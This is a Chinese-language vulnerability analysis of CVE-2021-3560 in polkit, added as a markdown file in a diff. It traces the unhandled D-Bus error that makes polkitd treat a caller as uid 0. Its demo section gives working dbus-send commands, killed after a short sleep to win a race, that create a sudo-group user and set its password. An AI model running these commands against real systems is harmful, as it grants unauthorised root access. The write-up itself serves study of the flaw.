@@ -1,0 +1,464 @@
+# CVE-2021-3560
+
+[toc]
+
+## 漏洞简介
+
+漏洞编号: CVE-2021-3560
+
+漏洞产品: PolKit (polkitd)
+
+漏洞版本: 源代码 0.113 引入 
+
+影响范围: https://www.venustech.com.cn/new_type/aqtg/20210611/22788.html
+
+利用后果: 本地提权
+
+源码获取: 
+
+- polkit-0.113: https://launchpad.net/debian/+source/policykit-1/0.113-5
+- accountsservice: `apt source accountsservice`
+- dbus: `apt source dbus`
+
+## 环境搭建
+
+[镜像链接](http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso)
+
+该ubuntu20 可以复现漏洞。没有制作docker。
+
+### 漏洞发生点
+
+首先查看问题所在代码
+
+/polkit-0.113/src/polkit/polkitsystembusname.c : 388 : polkit_system_bus_name_get_creds_sync 
+
+```c
+static void
+on_retrieved_unix_uid_pid (GObject              *src,
+			   GAsyncResult         *res,
+			   gpointer              user_data)
+{
+  AsyncGetBusNameCredsData *data = user_data;
+  GVariant *v;
+
+  v = g_dbus_connection_call_finish ((GDBusConnection*)src, res,
+				     data->caught_error ? NULL : data->error);
+  if (!v)
+    {
+      data->caught_error = TRUE; //某些原因失败之后设置error位
+    }
+  else
+  {
+      ··· ···//执行成功的数据处理
+  }
+  ··· ···
+}
+
+static gboolean
+polkit_system_bus_name_get_creds_sync (PolkitSystemBusName           *system_bus_name,
+				       guint32                       *out_uid,
+				       guint32                       *out_pid,
+				       GCancellable                  *cancellable,
+				       GError                       **error)
+{
+  gboolean ret = FALSE;
+  AsyncGetBusNameCredsData data = { 0, }; //data 被初始化为0
+  ··· ···
+  g_dbus_connection_call (connection,
+			  "org.freedesktop.DBus",       /* name */
+			  "/org/freedesktop/DBus",      /* object path */
+			  "org.freedesktop.DBus",       /* interface name */
+			  "GetConnectionUnixUser",      /* method */
+			  g_variant_new ("(s)", system_bus_name->name),
+			  G_VARIANT_TYPE ("(u)"),
+			  G_DBUS_CALL_FLAGS_NONE,
+			  -1,
+			  cancellable,
+			  on_retrieved_unix_uid_pid, //回调函数
+			  &data);
+  g_dbus_connection_call (connection,
+			  "org.freedesktop.DBus",       /* name */
+			  "/org/freedesktop/DBus",      /* object path */
+			  "org.freedesktop.DBus",       /* interface name */
+			  "GetConnectionUnixProcessID", /* method */
+			  g_variant_new ("(s)", system_bus_name->name),
+			  G_VARIANT_TYPE ("(u)"),
+			  G_DBUS_CALL_FLAGS_NONE,
+			  -1,
+			  cancellable,
+			  on_retrieved_unix_uid_pid, //回调函数
+			  &data);
+
+  while (!((data.retrieved_uid && data.retrieved_pid) || data.caught_error))
+    g_main_context_iteration (tmp_context, TRUE); //等待总线那边执行完毕，uid、pid都处理完毕或异常
+
+  if (out_uid)
+    *out_uid = data.uid;
+  if (out_pid)
+    *out_pid = data.pid;
+  ret = TRUE; //无论如何都是 TRUE？
+ out:
+  if (tmp_context)
+    {
+      g_main_context_pop_thread_default (tmp_context);
+      g_main_context_unref (tmp_context);
+    }
+  if (connection != NULL)
+    g_object_unref (connection);
+  return ret;
+}
+```
+
+在 `polkit_system_bus_name_get_creds_sync` 函数中，该函数是对某些请求进行身份认证(具体逻辑场景后文在详细介绍)。先后通过 `org.freedesktop.DBus` 总线调用了 `GetConnectionUnixUser` 方法与 `GetConnectionUnixProcessID` 方法，这两个方法由 `org.freedesktop.DBus` 总线提供，是获取请求进程的PID和用户UID，然后传入回调函数 `on_retrieved_unix_uid_pid` 处理返回的数据。然后阻塞等待总线那边进程执行完毕。
+
+可以在`on_retrieved_unix_uid_pid` 函数中看出，会根据总线那边执行返回的结果设置是否执行异常(error?) ，然后设置异常位，如果执行成功则老老实实返回用户UID或进程PID。但在`polkit_system_bus_name_get_creds_sync` 函数中，阻塞等待总线返回结果后(判断处理好的标志就是UID和PID都处理完毕或发生异常)。**也就是说，总线那边返回从逻辑上来说有三种结果，获取到用户UID为0 特权用户；获取到用户UID非0 普通用户；异常。**但在后面处理中，没有对异常进行处理，直接将要返回给上层的 `out_uid` 设置为了 总线返回的 `data.uid`，然后直接将`ret` 设置为了`TRUE`：
+
+```c
+  while (!((data.retrieved_uid && data.retrieved_pid) || data.caught_error))
+    g_main_context_iteration (tmp_context, TRUE); //等待总线那边执行完毕，uid、pid都处理完毕或异常
+
+  if (out_uid)
+    *out_uid = data.uid;
+  if (out_pid)
+    *out_pid = data.pid;
+  ret = TRUE; //无论如何都是 TRUE？
+```
+
+**但忽略了一种情况就是DBUS总线那边执行异常，导致回调函数设置了异常位就反悔了，根本没处理`data` 这个数据，而`data` 初始化是0，这就造成后续直接将`out_uid`设置成了0，也就是特权用户。**
+
+那么这个出问题的 `polkit_system_bus_name_get_creds_sync` 函数会在哪用到呢。
+
+### 触发路径
+
+漏洞点所在进程是 polkitd 进程：
+
+>polkit 是一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯：控制决策集中在统一的框架之中，决定低优先级进程是否有权访问高优先级进程。 
+
+简而言之就是，这是一个后台运行的root 进程，通过进程间通信的方式来对其他低权限进程访问高权限进程提供的功能时做一个权限判断。由于这个进程gdb 挂上就会重启，所以我们只能通过源码的层面进行分析，找到漏洞函数的触发路径：
+
+`polkitd` 里面大量使用了`gio DBUS` 进程间通信框架来开发，可以提前了解下[手册](https://www.freedesktop.org/software/gstreamer-sdk/data/docs/latest/gio/)，关注一些重点函数什么的。
+
+接下来分析`polkitd` 的漏洞触发路径，
+
+1. 首先是main：
+
+   polkit-0.113\src\polkitbackend\polkitd.c : 155 : main
+
+    ```c
+    int
+    main (int    argc,
+          char **argv)
+    {
+      ··· ···
+      ··· ···
+
+      loop = g_main_loop_new (NULL, FALSE);
+
+      sigint_id = g_unix_signal_add (SIGINT,
+                                     on_sigint,
+                                     NULL);
+
+      name_owner_id = g_bus_own_name (G_BUS_TYPE_SYSTEM,
+                                      "org.freedesktop.PolicyKit1",  //注册了一个总线名称
+                                      G_BUS_NAME_OWNER_FLAGS_ALLOW_REPLACEMENT |
+                                        (opt_replace ? G_BUS_NAME_OWNER_FLAGS_REPLACE : 0),
+                                      on_bus_acquired, //访问该总线时的回调函数
+                                      on_name_acquired,
+                                      on_name_lost,
+                                      NULL,
+                                      NULL);
+
+      g_print ("Entering main event loop\n");
+      g_main_loop_run (loop); //循环启动
+      ··· ···
+      ··· ···
+    }
+    ```
+
+2. 先注册了个叫`org.freedesktop.PolicyKit1` 的总线，然后有三个回调函数，主要关注`on_bus_acquired` ，会在总线被访问的时候调用。
+
+3. 在`on_bus_acquired` 函数中直接调用了一个注册类型的函数 `polkit_backend_authority_register` 
+
+4. 在 `polkit_backend_authority_register` 函数中，注册了一个接口对象`org.freedesktop.PolicyKit1.Authority`，并且传入一个回调函数表 `server_vtable`。漏洞触发点就在这个回调函数表中的一个：
+
+   policykit-1_0.113.orig\polkit-0.113\src\polkitbackend\polkitbackendauthority.c : 1333 : server_vtable
+
+    ```c
+    static const GDBusInterfaceVTable server_vtable =
+    {
+      server_handle_method_call, //回调函数
+      server_handle_get_property,
+      NULL, /* server_handle_set_property */
+    };
+    static void
+    server_handle_method_call (GDBusConnection        *connection,
+                               const gchar            *sender,
+                               const gchar            *object_path,
+                               const gchar            *interface_name,
+                               const gchar            *method_name,
+                               GVariant               *parameters,
+                               GDBusMethodInvocation  *invocation,
+                               gpointer                user_data)
+    {
+      Server *server = user_data;
+      PolkitSubject *caller;
+   
+      caller = polkit_system_bus_name_new (g_dbus_method_invocation_get_sender (invocation));
+   
+      if (g_strcmp0 (method_name, "EnumerateActions") == 0)
+        server_handle_enumerate_actions (server, parameters, caller, invocation);
+      else if (g_strcmp0 (method_name, "CheckAuthorization") == 0)
+        server_handle_check_authorization (server, parameters, caller, invocation); //漏洞函数路径在这里
+      ··· ···
+      ··· ···
+    }
+    ```
+   
+    当其他进程通过总线调用 `CheckAuthorization` 方法的时候就会调用到 `server_handle_check_authorization` 函数。
+
+5. 在`server_handle_check_authorization` 函数中，调用 `polkit_backend_authority_check_authorization`
+
+6. 在 `polkit_backend_authority_check_authorization` 函数中，通过回调掉用了 `klass->check_authorization` ,后者祖册的函数是 `polkit_backend_interactive_authority_check_authorization` :
+
+   polkit-0.113\src\polkitbackend\polkitbackendauthority.c : 195 : polkit_backend_authority_check_authorization
+
+   ```c
+   void
+   polkit_backend_authority_check_authorization (PolkitBackendAuthority        *authority,
+                                                 PolkitSubject                 *caller,
+                                                 PolkitSubject                 *subject,
+                                                 const gchar                   *action_id,
+                                                 PolkitDetails                 *details,
+                                                 PolkitCheckAuthorizationFlags  flags,
+                                                 GCancellable                  *cancellable,
+                                                 GAsyncReadyCallback            callback,
+                                                 gpointer                       user_data)
+   {
+     ··· ···
+     if (klass->check_authorization == NULL)
+       {
+         ··· ···
+       }
+     else
+       {
+         klass->check_authorization (authority, caller, subject, action_id, details, flags, cancellable, callback, user_data); // 注册的是polkit_backend_interactive_authority_check_authorization
+       }
+   }
+   authority_class->check_authorization             = /
+   polkit_backend_interactive_authority_check_authorization; //在别处初始化的
+   ```
+
+7. 接下来按顺序寻找就可以了：`check_authorization_sync`
+
+8. `polkit_backend_session_monitor_get_user_for_subject`
+
+1. 漏洞函数：`polkit_system_bus_name_get_user_sync` 
+
+也就是说在其他函数调用总线`org.freedesktop.PolicyKit1.Authority` 上的 `CheckAuthorization`方法的时候，在一定场景(控制DBUS获取申请UID返回异常)就会影响该方法的身份认证正确性。由于可以直接看答案，漏洞利用的方法就是，在使用account-daemon
+
+## 漏洞利用
+
+### 总体分析
+
+首先引用exp作者的这张图：
+
+<img src="img/image-20220131163536269.png" alt="image-20220131163536269" style="zoom: 80%;" />
+
+介绍一下图里的东西：
+
+- `polkitd 和 dbus-daemon` 还有`account-daemon` 三个进程都是root 权限运行的后台服务类进程。
+
+- `dbus-daemon` 就是一个进程见通信的“路由器”，也就是上面提到的GIO DBUS 进程间通信框架的核心。我的理解就是不同的进程可以去这里注册总线名，想要和你通信的进程访问总线名和接口、方法名调用你进程中的函数。上面介绍`polkitd` 进程的一些函数就是在dbus中注册总线等待其他进程调用。
+- `account-daemon` 类似`polkitd` ，在dbus 中注册了`org.freedesktop.Accounts` 总线，并提供一系列和账户相关的方法，比如接下来用到的添加用户、设置密码等。**并且该进程在添加用户之类的操作之前会对用户进行鉴权操作，采用的鉴权方法正是上文提到的`polkitd` 进程提供的有漏洞的总线方法 `CheckAuthorization`。**
+- `dbus-send` 是一个命令，dbus总线提供了一些编程接口以供进程间通信调用，同时也提供了命令行命令，可以直接向固定进程发送消息调用他们的方法。
+
+所以这里漏洞利用整体事件流程就是：
+
+1. 使用`dbus-send` 命令向 `account-daemon` 进程发送消息，让其创建一个**管理员用户(该进程提供的`CreateUser` 方法默认添加管理员用户)**，但以我们的身份是完成不了该操作的。
+2. 消息发送到 `account-daemon` 进程之后，`account-daemon` 会向`polkitd` 进程请求权限验证，是否批准此次用户添加操作。
+3. `polkitd` 会询问总线，发起创建用户请求的进程用户权限和进程id。
+   - 我们需要做的就是，在发送完消息，`account-daemon` 接受到消息到`polkitd` 询问申请进程权限的这段时间内将申请的进程(也就是`dbus-send` 进程) kill掉
+4. 这时总线发现申请添加用户的进程已经消失，就会返回异常。
+5. 经过上面的分析，**漏洞点在于 `polkitd` 进程对异常会默认成功，然后会默认用户uid 为0 即为特权用户**。触发漏洞，允许该操作。
+6. 虽然`dbus-send` 进程被kill，导致了总线检测会报异常，但`account-daemon` 并不会收到影响，在`account-daemon` 收到消息之后，就不会再关注申请进程是否存在了。
+7. `account-daemon` 收到了`polkitd` 回复的允许添加之后，创建用户，完成利用。
+
+### account-daemon 通信行为分析
+
+由于`dbus-daemon` 就是一个中转的进程，就不详细分析了，但这里分析一下`account-daemon` 该进程是利用过程中的关键进程。该进程也是一个使用`GIO DBUS` 框架的，简单分析一下里面的一些重点，首先查看一下
+
+accountsservice-0.6.45\src\daemon.c : 90 
+
+```c
+static void daemon_accounts_accounts_iface_init (AccountsAccountsIface *iface);
+
+G_DEFINE_TYPE_WITH_CODE (Daemon, daemon, ACCOUNTS_TYPE_ACCOUNTS_SKELETON, G_IMPLEMENT_INTERFACE (ACCOUNTS_TYPE_ACCOUNTS, daemon_accounts_accounts_iface_init));
+··· ···
+static void
+daemon_accounts_accounts_iface_init (AccountsAccountsIface *iface)
+{
+        iface->handle_create_user = daemon_create_user;
+        iface->handle_delete_user = daemon_delete_user;
+        ··· ···
+}
+```
+
+这里使用 `G_DEFINE_TYPE_WITH_COD`E 和 `G_IMPLEMENT_INTERFACE` 宏来执行 `daemon_accounts_accounts_iface_init` 函数，这俩宏的意思总之就是会找机会执行`daemon_accounts_accounts_iface_init` 函数，在 `daemon_accounts_accounts_iface_init` 函数中注册了`create_user` 的方法，直接查看`daemon_create_user` 函数实现：
+
+accountsservice-0.6.45\src\daemon.c : 1099
+
+```c
+static gboolean
+daemon_create_user (AccountsAccounts      *accounts,
+                    GDBusMethodInvocation *context,
+                    const gchar           *user_name,
+                    const gchar           *real_name,
+                    gint                   account_type)
+{
+        ··· ···
+        data = g_new0 (CreateUserData, 1);
+        data->user_name = g_strdup (user_name);
+        data->real_name = g_strdup (real_name);
+        data->account_type = account_type;
+
+        daemon_local_check_auth (daemon,
+                                 NULL,
+                                 "org.freedesktop.accounts.user-administration",
+                                 TRUE,
+                                 daemon_create_user_authorized_cb, //回调函数
+                                 context,
+                                 data,
+                                 (GDestroyNotify)create_data_free);
+
+        return TRUE;
+}
+```
+
+在`daemon_create_user` 之中调用了`daemon_local_check_auth` 函数校验申请用户的权限是否允许，调用成功之后会调用回调函数 `daemon_create_user_authorized_cb` ，这里先看鉴权函数`daemon_local_check_auth`:
+
+accountsservice-0.6.45\src\daemon.c : 1388 : daemon_local_check_auth
+
+```c
+void
+daemon_local_check_auth (Daemon                *daemon,
+                         User                  *user,
+                         const gchar           *action_id,
+                         gboolean               allow_interaction,
+                         AuthorizedCallback     authorized_cb,
+                         GDBusMethodInvocation *context,
+                         gpointer               authorized_cb_data,
+                         GDestroyNotify         destroy_notify)
+{
+        ··· ···
+        polkit_authority_check_authorization (daemon->priv->authority,
+                                              subject,
+                                              action_id,
+                                              NULL,
+                                              flags,
+                                              NULL,
+                                              (GAsyncReadyCallback) check_auth_cb,
+                                              data);
+        ··· ···
+}
+```
+
+这里调用了 `polkit_authority_check_authorization` 函数去鉴权，`polkit_authority_check_authorization` 是一个`libpolkit-gobject-1.so.0` 提供的库函数，就是直接调用上面分析`polkitd` 进程中的总线`org.freedesktop.PolicyKit1.Authority` 上的 `CheckAuthorization`方法来鉴权。鉴权成功会调用回调函数 `daemon_create_user_authorized_cb` ：
+
+accountsservice-0.6.45\src\daemon.c : 1051 : daemon_create_user_authorized_cb
+
+```c
+static void
+daemon_create_user_authorized_cb (Daemon                *daemon,
+                                  User                  *dummy,
+                                  GDBusMethodInvocation *context,
+                                  gpointer               data)
+
+{
+        ··· ···
+
+        argv[0] = "/usr/sbin/adduser";
+        argv[1] = "--quiet";
+        argv[2] = "--disabled-login";
+        argv[3] = "--gecos";
+        argv[4] = cd->real_name;
+        argv[5] = cd->user_name;
+        argv[6] = NULL;
+
+        error = NULL;
+        if (!spawn_with_login_uid (context, argv, &error)) { //添加用户
+                throw_error (context, ERROR_FAILED, "running '%s' failed: %s", argv[0], error->message);
+                g_error_free (error);
+                return;
+        }
+
+        if (cd->account_type == ACCOUNT_TYPE_ADMINISTRATOR) {
+                add_user_to_group (context, cd->user_name, "sudo"); //将用户添加到sudo 组
+        }
+
+        ··· ···
+}
+```
+
+这里已经很明显了，添加用户成功之后，直接将用户添加到sudo 用户组，所以在exp 最后添加完用户之后可以通过`sudo su root` 来切换到root。
+
+接下来看一下手动漏洞利用的demo
+
+### demo
+
+以普通用户身份直接使用dbus-send 命令向account-daemon 发送创建用户的请求：
+
+```shell
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:pwnpolkit string:"pwnpolkit" int32:1
+```
+
+该请求在图形界面操作系统中会弹出输入密码的窗口：
+
+<img src="img/image-20220131153323446.png" alt="image-20220131153323446" style="zoom:50%;" />
+
+在ssh这种命令行终端会直接失败：
+
+![image-20220131153521697](img/image-20220131153521697.png)
+
+根据上面漏洞利用的思路，首先看一下该命令执行时间：
+
+```sh
+time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:pwnpolkit string:"pwnpolkit" int32:1
+```
+
+![image-20220131153802829](img/image-20220131153802829.png)
+
+然后选择在该命令执行一半左右的时间的时候kill掉，就有概率触发漏洞创建成功：
+
+```sh
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:pwnpolkit string:"pwnpolkit" int32:1 & sleep 0.04s ; kill $!
+```
+
+多次执行就可成功了：
+
+![image-20220131154220337](img/image-20220131154220337.png)
+
+并且也在sudo 用户组内：
+
+![image-20220131154304858](img/image-20220131154304858.png)
+
+然后同样的方法再给它添加个密码就行了：
+
+```sh
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$jgqh/7aYiUhpISRA$awGxCtnbYKoAtNVtzUvd6jxw/.1VApN5CvUYyLXUMj0' string:Whatever & sleep 0.04s ; kill $!
+```
+
+User1002 需要根据刚创建的用户UID 修改一下，密码使用哈希值。然后切换到用户
+
+### exp
+
+这里没详细写exp，其实就是将上面的命令自动化即可。github 上面的C语言exp 跑了也是ok 的。
+
+[hakivvi/CVE-2021-3560](https://github.com/hakivvi/CVE-2021-3560)
+
+## 参考
+
+漏洞纰漏(github)：https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
+
+hakivvi/exp(github): https://github.com/hakivvi/CVE-2021-3560
+
+m0_56642842(CSDN): https://blog.csdn.net/m0_56642842/article/details/118807718?spm=1001.2014.3001.5502
